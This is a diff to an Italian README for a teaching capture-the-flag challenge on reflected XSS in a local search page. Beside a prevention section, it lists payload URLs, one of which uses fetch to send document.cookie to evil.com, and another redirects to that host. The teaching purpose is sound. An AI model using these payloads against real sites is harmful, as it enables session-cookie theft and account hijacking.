@@ -1,20 +1,65 @@
-# Challenge: XSS Exploit - Online Store Search Injection
+# Challenge 1 - Reflected XSS
 
-## Descrizione
-In questa challenge, hai accesso a un negozio online che permette di cercare prodotti attraverso un campo di ricerca.  
-Tuttavia, il sito non implementa correttamente la **sanitizzazione degli input**, rendendolo vulnerabile a un attacco **XSS (Cross-Site Scripting)**.  
-Sfruttando questa vulnerabilità, potresti eseguire codice JavaScript arbitrario all'interno del browser delle vittime.
-
-Sarà possibile iniettare uno script dannoso e rubare informazioni sensibili?
+Questa challenge è stata creata per dimostrare il concetto di Cross-Site Scripting (XSS) Reflected, un tipo di vulnerabilità web che permette l'iniezione di codice JavaScript malevolo.
 
 ## Obiettivo
-- **Sfrutta la vulnerabilità XSS** per eseguire codice JavaScript all'interno del sito.
-- **Dimostra l'exploit** eseguendo un alert con `document.cookie` o rubando i cookie della sessione.
+Lo scopo di questa challenge non è trovare una flag specifica, ma comprendere come funziona un attacco XSS Reflected e come può essere utilizzato per eseguire codice JavaScript arbitrario nel contesto di una pagina web.
 
-## Suggerimenti
-- Il valore della ricerca viene inserito direttamente nel DOM senza protezione.
-- Prova a iniettare un payload come `<script>alert('XSS!')</script>`.
-- Potresti anche provare payload più avanzati per esfiltrare dati sensibili.
+## Come funziona
+La challenge presenta un'applicazione web con una funzionalità di ricerca. Il parametro `q` nella query string viene riflesso direttamente nella pagina HTML senza alcuna sanitizzazione.
+
+## Esempio di attacco
+Puoi provare a iniettare codice JavaScript in diversi modi:
+
+1. Alert semplice:
+```
+http://localhost:801/?q=<script>alert(1)</script>
+```
+
+2. Visualizzare i cookie:
+```
+http://localhost:801/?q=<script>alert(document.cookie)</script>
+```
+
+3. Redirect a un altro sito:
+```
+http://localhost:801/?q=<script>window.location.href="https://evil.com"</script>
+```
+
+4. Inviare dati a un server controllato dall'attaccante:
+```
+http://localhost:801/?q=<script>fetch('https://evil.com?cookie='+document.cookie)</script>
+```
+
+## Come funziona l'attacco
+1. L'utente inserisce del codice JavaScript malevolo nel campo di ricerca
+2. Il server riflette questo input direttamente nella pagina HTML
+3. Il browser interpreta il JavaScript riflesso come codice eseguibile
+4. Il codice viene eseguito nel contesto della pagina web
+
+## Implicazioni di sicurezza
+- Il codice JavaScript viene eseguito nel contesto della pagina web
+- Può accedere a:
+  - Cookie del dominio
+  - DOM della pagina
+  - Local Storage
+  - Session Storage
+  - E altre risorse accessibili via JavaScript
+
+## Prevenzione
+Per prevenire attacchi XSS, è importante:
+1. Sanitizzare tutti gli input utente
+2. Utilizzare escape appropriati per i dati riflessi
+3. Implementare Content Security Policy (CSP)
+4. Utilizzare framework che gestiscono automaticamente la sanitizzazione
+
+## Note
+Questa è una challenge didattica che dimostra un concetto base di sicurezza web. In un ambiente reale, queste vulnerabilità potrebbero essere sfruttate per:
+- Furto di cookie
+- Furto di dati sensibili
+- Manipolazione del DOM
+- Reindirizzamenti malevoli
+- Esecuzione di azioni non autorizzate
 
 ## Avviare il server:
 ```bash
